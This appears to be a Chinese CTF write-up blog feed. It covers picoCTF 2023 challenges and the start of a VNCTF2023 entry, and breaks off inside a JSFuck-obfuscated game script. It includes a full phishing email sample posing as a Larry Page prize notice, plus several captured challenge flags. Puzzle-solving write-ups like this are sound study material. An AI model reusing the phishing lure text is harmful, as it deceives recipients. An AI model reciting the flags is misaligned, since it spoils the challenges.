francismanzi@gmail.com<br>Received: <span class="hljs-keyword">by</span> <span class="hljs-number">2002</span>:ab0:<span class="hljs-number">638</span>a:<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:<span class="hljs-number">0</span> <span class="hljs-keyword">with</span> SMTP <span class="hljs-built_in">id</span> y10csp123720uao;<br>        Thu, <span class="hljs-number">7</span> Jul <span class="hljs-number">2022</span> <span class="hljs-number">23</span>:<span class="hljs-number">19</span>:<span class="hljs-number">48</span> <span class="hljs-number">-0700</span> (PDT)<br>X-Google-Smtp-Source: AGRyM1u8MgQ0wT0JmPs4nZbKyuwluXeP+mglR/hb66VElgQnwB8M2ofwYUFsHj+eMYBFAVDPITJc<br>X-Received: <span class="hljs-keyword">by</span> <span class="hljs-number">2002</span>:a5d:<span class="hljs-number">6</span>d06:<span class="hljs-number">0</span>:b0:<span class="hljs-number">21</span>b:c434:d99e <span class="hljs-keyword">with</span> SMTP <span class="hljs-built_in">id</span> e6<span class="hljs-number">-20020</span>a5d6d06000000b0021bc434d99emr1524437wrq<span class="hljs-number">.148</span><span class="hljs-number">.1657261188086</span>;<br>        Thu, <span class="hljs-number">07</span> Jul <span class="hljs-number">2022</span> <span class="hljs-number">23</span>:<span class="hljs-number">19</span>:<span class="hljs-number">48</span> <span class="hljs-number">-0700</span> (PDT)<br>ARC-Seal: i=<span class="hljs-number">1</span>; a=rsa-sha256; t=<span class="hljs-number">1657261188</span>; cv=none;<br>        d=google.com; s=arc<span class="hljs-number">-20160816</span>;<br>        b=FJZQS4geDnyabQ7SUhA2v3roEqcufLmysXkLoRZd3yNXiNQFBFmwm5v5yANvDyyebA<br>         Jfjqv5X8Gujll585xj/MHlVhlEMg0edNWuwnLXj8SmNuPI1Jon9N+fokhSMxy2WxSACE<br>         <span class="hljs-number">4</span>MruPo5QBlHdrFq8WNBAFgC1VtO0nR+BQYY18wqotLIQPvkXo3yOUUhx0D+ZjUwXvTKV<br>         yUFGdYulF58Lg7wAH/cLWROIHrraWTSsmaGWoYv577nztzueoG5RC5uUAGIAyzsJRqsV<br>         dCsapFxCUlbYbAgIVraylksCA+veFXfil6ocym8KKnls3j40Vojv0VLhHHZxXruG5x/K<br>         M5cQ==<br>ARC-Message-Signature: i=<span class="hljs-number">1</span>; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc<span class="hljs-number">-20160816</span>;<br>        h=mime-<span class="hljs-built_in">version</span>:message-<span class="hljs-built_in">id</span>:<span class="hljs-built_in">date</span>:subject:<span class="hljs-keyword">to</span>:<span class="hljs-keyword">from</span>:dkim-signature;<br>        bh=RneTbuEOZUlwei4ZNPvzjmZpQE92irBmuzImA33zPEc=;<br>        b=RUd+ycq1YWbRNn9wB8UgJ8dZz0tHpvmqcEGQkWqzLy/<span class="hljs-number">6</span>j3aFzaf7dwdoCtXjTTtrrE<br>         z9g498cmB55fs0x1CAjtzI+Nctb1cbPcnfMCrfsF3LwgYhCErFRnbBbOgqw4eeEB+hk0<br>         sKBN0QVpSLs1HlF8ZK3XiMKA2p3vSgHlbhMDPGnFTLHEQjlM63d/L30Rt8mpQsT77ni/<br>         f6X0TqTi4Y8ARIuEELMa6m5E5wQcfUxeUU5WAssz46tQyHKR6xg/g8K2zES+gSNymASk<br>         c5Eaq55k4Zi8dXWaPIwg4IdhVLVxe4llMx8c46GTdh8tvdMtmjME3wIaFR6Q2SLWRSZA<br>         o0hw==<br>ARC-Authentication-Results: i=<span class="hljs-number">1</span>; mx.google.com;<br>       dkim=pass header.i=@onionmail.org header.s=jan2022 header.b=<span class="hljs-number">4</span>sU2nk5Z;<br>       spf=pass (google.com: domain <span class="hljs-keyword">of</span> lpage@onionmail.org designates <span class="hljs-number">173.249</span><span class="hljs-number">.33</span><span class="hljs-number">.206</span> <span class="hljs-keyword">as</span> permitted sender) smtp.mailfrom=lpage@onionmail.org;<br>       dmarc=pass (p=NONE sp=NONE dis=NONE) header.<span class="hljs-keyword">from</span>=onionmail.org<br>Return-Path: &lt;lpage@onionmail.org&gt;<br>Received: <span class="hljs-keyword">from</span> mail.onionmail.org (mail.onionmail.org. [<span class="hljs-number">173.249</span><span class="hljs-number">.33</span><span class="hljs-number">.206</span>])<br>        <span class="hljs-keyword">by</span> mx.google.com <span class="hljs-keyword">with</span> ESMTPS <span class="hljs-built_in">id</span> f16<span class="hljs-number">-20020</span>a05600c4e9000b003a1947873d6si1882702wmq<span class="hljs-number">.224</span><span class="hljs-number">.2022</span><span class="hljs-number">.07</span><span class="hljs-number">.07</span><span class="hljs-number">.23</span><span class="hljs-number">.19</span><span class="hljs-number">.47</span><br>        <span class="hljs-keyword">for</span> &lt;francismanzi@gmail.com&gt;<br>        (<span class="hljs-built_in">version</span>=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=<span class="hljs-number">256</span>/<span class="hljs-number">256</span>);<br>        Thu, <span class="hljs-number">07</span> Jul <span class="hljs-number">2022</span> <span class="hljs-number">23</span>:<span class="hljs-number">19</span>:<span class="hljs-number">47</span> <span class="hljs-number">-0700</span> (PDT)<br>Received-SPF: pass (google.com: domain <span class="hljs-keyword">of</span> lpage@onionmail.org designates <span class="hljs-number">173.249</span><span class="hljs-number">.33</span><span class="hljs-number">.206</span> <span class="hljs-keyword">as</span> permitted sender) client-ip=<span class="hljs-number">173.249</span><span class="hljs-number">.33</span><span class="hljs-number">.206</span>;<br>Authentication-Results: mx.google.com;<br>       dkim=pass header.i=@onionmail.org header.s=jan2022 header.b=<span class="hljs-number">4</span>sU2nk5Z;<br>       spf=pass (google.com: domain <span class="hljs-keyword">of</span> lpage@onionmail.org designates <span class="hljs-number">173.249</span><span class="hljs-number">.33</span><span class="hljs-number">.206</span> <span class="hljs-keyword">as</span> permitted sender) smtp.mailfrom=lpage@onionmail.org;<br>       dmarc=pass (p=NONE sp=NONE dis=NONE) header.<span class="hljs-keyword">from</span>=onionmail.org<br>DKIM-Signature: v=<span class="hljs-number">1</span>; a=rsa-sha256; c=relaxed/relaxed; d=onionmail.org;<br> q=dns/txt; s=jan2022; bh=RneTbuEOZUlwei4ZNPvzjmZpQE92irBmuzImA33zPEc=;<br> h=<span class="hljs-keyword">from</span>:subject:<span class="hljs-built_in">date</span>:message-<span class="hljs-built_in">id</span>:<span class="hljs-keyword">to</span>:mime-<span class="hljs-built_in">version</span>:content-type;<br> b=<span class="hljs-number">4</span>sU2nk5ZG4F9+lCtCPU4nat6ovALqfOHOUM1/wTskeMdmMAa2yOMXy0GkqolIioL8nG0mRG45<br> OD8b/nHZZEiA0aQppYHECSmXE7IFIFm/MP9wmXIlC/cDF1t9mEwumdDbes7hRhiO6q3A0wYWK+J<br> C+qwHI99irsPhWZOptVVh0HV/HJPAtkzg7OBMX/oPDUSG3xo7dJvT5MCYUm2+<span class="hljs-number">4</span>CBVjvLmEPUVTO<br> uuVEU3HjVjumry5zw1H4s+o9jxCOwpT41uL94NM64Aki4+KIlS75W8Uo1YStqciHSHoEPLMvBhK<br> OMfwhI02u5oLFbk6ZvmhyK5juc54lGbWgk277N0hB0Aw==<br>Received: <span class="hljs-keyword">from</span> localhost<br> <span class="hljs-keyword">by</span> mail.onionmail.org (ZoneMTA) <span class="hljs-keyword">with</span> API <span class="hljs-built_in">id</span> <span class="hljs-number">181</span>dc76dff2000ccee<span class="hljs-number">.001</span><br> <span class="hljs-keyword">for</span> &lt;francismanzi@gmail.com&gt;;<br> Fri, <span class="hljs-number">08</span> Jul <span class="hljs-number">2022</span> <span class="hljs-number">06</span>:<span class="hljs-number">19</span>:<span class="hljs-number">47</span> +<span class="hljs-number">0000</span><br>X-Zone-Loop: <span class="hljs-number">83440723</span>a48cf749c9e7702024ee772d7cb2fb7cab7a<br>Content-Type: multipart/mixed; boundary=<span class="hljs-string">&quot;--_NmP-426c22a2e0d8fc9a-Part_1&quot;</span><br>From: Larry Page &lt;lpage@onionmail.org&gt;<br>To: francismanzi@gmail.com<br>Subject: One million Prize<br>Date: Fri, <span class="hljs-number">08</span> Jul <span class="hljs-number">2022</span> <span class="hljs-number">06</span>:<span class="hljs-number">19</span>:<span class="hljs-number">47</span> +<span class="hljs-number">0000</span><br>Message-ID: &lt;<span class="hljs-number">03</span>c11cd1<span class="hljs-number">-8</span>fd9<span class="hljs-number">-584</span>e-c9d7-e53df0faeccc@onionmail.org&gt;<br>MIME-Version: <span class="hljs-number">1.0</span><br><br><span class="hljs-comment">----_NmP-426c22a2e0d8fc9a-Part_1</span><br>Content-Type: multipart/alternative;<br> boundary=<span class="hljs-string">&quot;--_NmP-426c22a2e0d8fc9a-Part_2&quot;</span><br><br><span class="hljs-comment">----_NmP-426c22a2e0d8fc9a-Part_2</span><br>Content-Type: <span class="hljs-built_in">text</span>/plain; charset=utf<span class="hljs-number">-8</span><br>Content-Transfer-Encoding: quoted-printable<br><br>Hello dear user, I am Larry Page <span class="hljs-keyword">and</span> I am delighted <span class="hljs-keyword">to</span> announce <span class="hljs-keyword">to</span> you <span class="hljs-keyword">that</span>=<br> you<br>are <span class="hljs-keyword">the</span> <span class="hljs-number">99999999</span>th GMAIL account <span class="hljs-keyword">and</span> <span class="hljs-keyword">for</span> <span class="hljs-keyword">that</span> we want <span class="hljs-keyword">to</span> reward you. =<br>You&#x27;ve<br>earned $<span class="hljs-number">1</span>,<span class="hljs-number">000</span>,<span class="hljs-number">000.</span> To claim your prize open <span class="hljs-keyword">the</span> attached <span class="hljs-built_in">file</span>.<br><span class="hljs-comment">----_NmP-426c22a2e0d8fc9a-Part_2</span><br>Content-Type: <span class="hljs-built_in">text</span>/html; charset=utf<span class="hljs-number">-8</span><br>Content-Transfer-Encoding: quoted-printable<br><br>&lt;p&gt;Hello dear user, I am Larry Page <span class="hljs-keyword">and</span> I am delighted <span class="hljs-keyword">to</span> announce <span class="hljs-keyword">to</span> you =<br><span class="hljs-keyword">that</span> you are <span class="hljs-keyword">the</span> <span class="hljs-number">99999999</span>th GMAIL account <span class="hljs-keyword">and</span> <span class="hljs-keyword">for</span> <span class="hljs-keyword">that</span> we want <span class="hljs-keyword">to</span> reward =<br>you. You&#x27;ve earned $<span class="hljs-number">1</span>,<span class="hljs-number">000</span>,<span class="hljs-number">000.</span> To claim your prize open <span class="hljs-keyword">the</span> attached <span class="hljs-built_in">file</span>.=<br>&lt;br&gt;&lt;/p&gt;<br><span class="hljs-comment">----_NmP-426c22a2e0d8fc9a-Part_2--</span><br><br><span class="hljs-comment">----_NmP-426c22a2e0d8fc9a-Part_1</span><br>Content-Type: <span class="hljs-built_in">text</span>/plain; <span class="hljs-built_in">name</span>=attachment.txt<br>Content-Transfer-Encoding: base64<br>Content-Disposition: attachment; filename=attachment.txt<br><br>QW1vdW50OiAgJDEsMDAwLDAwMAo=<br><span class="hljs-comment">----_NmP-426c22a2e0d8fc9a-Part_1--</span><br></code></pre></td></tr></table></figure><p>分析一下发现邮件是来自ip<code>173.249.33.206</code></p><p>用<code>whois</code>命令</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">whois</span> <span class="hljs-number">173.249.33.206</span><br></code></pre></td></tr></table></figure><img src="/2023/03/20/picoCTF2023/12.png" class=""><h3 id="0x0dfindandopen"><a class="markdownIt-Anchor" href="#0x0dfindandopen"></a> 0x0DFindAndOpen</h3><p>在第48个数据包发现base64编码</p><img src="/2023/03/20/picoCTF2023/13.png" class=""><p>解码<code>This is the secret: picoCTF&#123;R34DING_LOKd_</code></p><p>把这一半当做压缩包密码解码得到flag<code>picoCTF&#123;R34DING_LOKd_fil56_succ3ss_cbf2ebf6&#125;</code></p><h3 id="0x0emsb"><a class="markdownIt-Anchor" href="#0x0emsb"></a> 0x0EMSB</h3><p>发现图片在各个颜色第七管道变化</p><img src="/2023/03/20/picoCTF2023/14.png" class=""><p>直接全部复制下来，然后查找pico</p><img src="/2023/03/20/picoCTF2023/15.png" class=""><h3 id="0x0fchrono"><a class="markdownIt-Anchor" href="#0x0fchrono"></a> 0x0Fchrono</h3><img src="/2023/03/20/picoCTF2023/16.png" class=""><h3 id="0x10money-ware"><a class="markdownIt-Anchor" href="#0x10money-ware"></a> 0x10money-ware</h3><p>提示借助google</p><img src="/2023/03/20/picoCTF2023/17.png" class=""><img src="/2023/03/20/picoCTF2023/18.png" class=""><h3 id="0x11permissions"><a class="markdownIt-Anchor" href="#0x11permissions"></a> 0x11Permissions</h3><p>步骤同chrono</p><h3 id="0x12repetitions"><a class="markdownIt-Anchor" href="#0x12repetitions"></a> 0x12repetitions</h3><p>连续的base64编码</p><p>连续解码后得到<code>picoCTF&#123;base64_n3st3d_dic0d!n8_d0wnl04d3d_4557ec3e&#125;</code></p><h3 id="0x13rules-2023"><a class="markdownIt-Anchor" href="#0x13rules-2023"></a> 0x13Rules 2023</h3><p>直接页面源码搜<code>picoCTF&#123;</code></p><img src="/2023/03/20/picoCTF2023/19.png" class=""><h3 id="0x14two-sum"><a class="markdownIt-Anchor" href="#0x14two-sum"></a> 0x14two-sum</h3><p>下载C语言源码，输入两个数，满足<code>n1 &gt; n1 + n2 OR n2 &gt; n1 + n2</code></p><p>属于整数溢出</p><p>c语言int类型溢出是大于<code>2147483647</code></p><p>所以输入 <code>2147483647</code>和<code>1</code></p><img src="/2023/03/20/picoCTF2023/20.png" class=""><h3 id="0x15ready-gladiator-0"><a class="markdownIt-Anchor" href="#0x15ready-gladiator-0"></a> 0x15Ready Gladiator 0</h3><p>直接输个<code>end</code>就出flag,没看源码，不知道什么原理<code>picoCTF&#123;h3r0_t0_z3r0_4m1r1gh7_a7bf8a57&#125;</code></p><h3 id="0x16useless"><a class="markdownIt-Anchor" href="#0x16useless"></a> 0x16useless</h3><p>居然是把flag藏在帮助文档里面</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">man useless</span><br></code></pre></td></tr></table></figure><img src="/2023/03/20/picoCTF2023/21.png" class=""><h3 id="0x17timer"><a class="markdownIt-Anchor" href="#0x17timer"></a> 0x17timer</h3><p>用jadx打开在<code>com/example.timer/BuildConfig</code>可以找到flag<code>picoCTF&#123;t1m3r_r3v3rs3d_succ355fully_17496&#125;</code></p>]]></content>
    
    
    <categories>
      
      <category>WP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>VNCTF2023</title>
    <link href="/2023/02/19/VNCTF2023/"/>
    <url>/2023/02/19/VNCTF2023/</url>
    
    <content type="html"><![CDATA[<h3 id="象棋王子"><a class="markdownIt-Anchor" href="#象棋王子"></a> 象棋王子</h3><p>前端JS游戏，按照之前发过的一篇<a href="https://fru1ts.github.io/2023/01/14/%E5%89%8D%E7%AB%AFjs/">前端JS</a>的思路，直接看js文件</p><p>可以发现<code>play.js</code>有结束的判断</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js">play.<span class="hljs-property">showWin</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">my</span>)&#123;<br>play.<span class="hljs-property">isPlay</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-keyword">if</span> (my===<span class="hljs-number">1</span>)&#123;<br>[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]])+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]])()([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]]+((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[+[]]+(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[+[]]+(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(+[![]]+[])[+[]]+(!![]+[])[+[]]+[+!+[]]+[+[]]+[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]]+[!+[]+!+[]]+[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[+!+[]])[(![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]]((!![]+[])[+[]])[([][(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]](([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[